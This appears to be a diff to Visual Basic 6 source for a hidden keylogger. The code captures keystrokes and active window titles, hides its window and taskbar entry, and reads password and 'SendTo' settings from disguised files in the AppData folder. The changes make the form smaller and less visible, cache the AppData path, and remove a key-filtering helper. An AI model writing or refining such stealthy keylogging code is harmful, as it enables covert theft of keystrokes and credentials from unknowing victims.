@@ -1,28 +1,29 @@
 VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
-   Caption         =   "Windows Explorer"
-   ClientHeight    =   90
+   ClientHeight    =   0
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   90
+   ClientWidth     =   15
+   ClipControls    =   0   'False
+   ControlBox      =   0   'False
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   6
+   ScaleHeight     =   0
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   6
+   ScaleWidth      =   1
    ShowInTaskbar   =   0   'False
    Begin VB.Timer Timer1 
       Enabled         =   0   'False
-      Interval        =   10
-      Left            =   4560
-      Top             =   720
+      Interval        =   60
+      Left            =   3120
+      Top             =   600
    End
    Begin VB.Timer Timer2 
       Interval        =   450
-      Left            =   3960
+      Left            =   3360
       Top             =   0
    End
    Begin VB.TextBox Text2 
@@ -57,6 +58,7 @@ Public Enum mceIDLPaths
     CSIDL_WINDOWS = &H24 ' C:\WINNT.
 End Enum
 Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
+Dim AppDataPath As String
 
 'Active windowtitle part
 Private Declare Function GetForegroundWindow Lib "user32" () As Long
@@ -88,6 +90,8 @@ End If
 Me.Left = Screen.Width - Me.Width
 Me.Top = Screen.Height - Me.Height
 
+AppDataPath = GetSpecialFolderA(CSIDL_APPDATA)
+
 App.TaskVisible = False
 
 Timer2.Enabled = True
@@ -117,9 +121,10 @@ End Sub
 
 Private Sub LoadSetting()
 Dim SendTo As String
-If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") <> "" Then 'setting file found then
+
+If Dir(AppDataPath & "System\cmsetacl.tmp") <> "" Then 'setting file found then
     
-    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") For Input As 1
+    Open (AppDataPath & "System\cmsetacl.tmp") For Input As 1
     Input #1, LPath, Pwd, PCDec, SendTo
     Close #1
 Else    'setting not found
@@ -153,31 +158,16 @@ If Result = -32767 Then
                 If Len(Text1) > 0 And Right(Text1.Text, 1) <> "]" And Right(Text1.Text, 1) <> Chr(13) Then Text1.Text = Left(Text1.Text, Len(Text1) - 1)
         Else
             Text1.Text = Text1.Text + CheckShift(i)
-            HasSomeText = IsTextKey(i)
         End If
     End If
 
 End If
 Next i
 End Sub
-Private Function IsTextKey(KeyNo As Integer) As Boolean
 
-Select Case KeyNo
-Case 48 To 57
-IsTextKey = True
-Case 96 To 105
-IsTextKey = True
-Case 107 To 111
-IsTextKey = True
-Case 186 To 221
-IsTextKey = True
-Case Else
-IsTextKey = False
-End Select
-
-End Function
 'If ActiveWindow Title changes then Records text from text box to file
 Private Sub Text2_Change()
+
 
 If HasSomeText = True Then
     If Trim(Text1) <> "" Then Call Appendnow
@@ -187,9 +177,9 @@ HasSomeText = False
 
 Dim t1, t2, t3, t4, t5 As String
 
-If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") <> "" Then 'setting file found then
+If Dir(AppDataPath & "System\default.MCP") <> "" Then 'setting file found then
     
-    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Input As 1
+    Open (AppDataPath & "System\default.MCP") For Input As 1
     Input #1, t1, t2, t3, t4, t5
     Close #1
 
